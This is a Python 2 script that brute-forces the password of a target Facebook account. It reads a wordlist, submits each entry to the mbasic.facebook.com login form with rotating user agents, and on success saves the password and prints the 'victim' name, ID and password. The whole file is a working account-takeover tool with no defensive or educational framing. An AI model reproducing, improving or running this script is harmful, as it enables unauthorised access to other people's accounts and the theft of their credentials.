#!/usr/bin/python
# coding=utf-8
#//////Coded By : Cabdulahi Sharif

import sys,time,os
import mechanize
import random
import cookielib
import re
import banner
def prRed(skk): print("\033[91m {}\033[00m" .format(skk)) 
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk)) 
def prYellow(skk): print("\033[93m {}\033[00m" .format(skk)) 
def prLightPurple(skk): print("\033[94m {}\033[00m" .format(skk)) 
def prPurple(skk): print("\033[95m {}\033[00m" .format(skk)) 
def prCyan(skk): print("\033[96m {}\033[00m" .format(skk)) 
def prLightGray(skk): print("\033[97m {}\033[00m" .format(skk)) 
def prBlack(skk): print("\033[98m {}\033[00m" .format(skk)) 

huh = '\033[32;1m'

#Target Website
login = ('https://mbasic.facebook.com/login.php')






#useragents
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

class shit:
 def __init__(self):
     banner.banner()
     self.file = open('passwords.txt','w')
     self.targ = str(raw_input("\n[🔧]Enter Target Id: "+huh+''))
     print 
     self.passwordlist = str(raw_input("\n[🔧]Enter Wordlist File: "+huh+''))
     self.br = mechanize.Browser()
     self.cj = cookielib.LWPCookieJar()
     self.br.set_handle_robots(False)
     self.br.set_handle_redirect(True)
     self.br.set_cookiejar(self.cj)
     self.br.set_handle_equiv(True)
     self.br.set_handle_referer(True)
     self.br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
     self.fuck()
     print(red+'     ✅✅'+'Sorry Password No Found')
     exit()
	



 def sex(self):
     print
     sys.stdout.write("\r          [🔨]Trying ..... {}".format(self.password))
     sys.stdout.flush()
     self.br.addheaders = [('User-agent', random.choice(useragents))]
     site = self.br.open(login)
     self.br.select_form(nr = 0)
     self.br.form["email"] = self.targ
     self.br.form["pass"] = self.password
     self.br.submit()
     url = self.br.geturl()
     if 'save-device' in url or 'm_sess' in url:
         print
         self.file.write(self.password)
         print(huh+"\n           [✔✔] Password Found ")
         try:
             print
             web = ("https://m.facebook.com/"+self.targ)
             url = web
             self.br.open(url)
             self.r=re.findall('<title>(.*?)</title>',self.br.response().read())
             if len(self.r) !=0:
                 print('      💀'+'Victim Name: {}'.format(self.r[0]))
                 print('      💀'+'Victim Id: {}'.format(self.targ))
                 print('      💀'+'Victim Password: {}'.format(self.password))
                 print
                 print
                 print
                 print
                 time.sleep(2)
                 exit()
         except Exception as j:
             print j
            
				


 def fuck(self):
     global password
     self.passwords = open(self.passwordlist,"r")
     for password in self.passwords:
         self.password = password.replace("\n","")
         self.sex()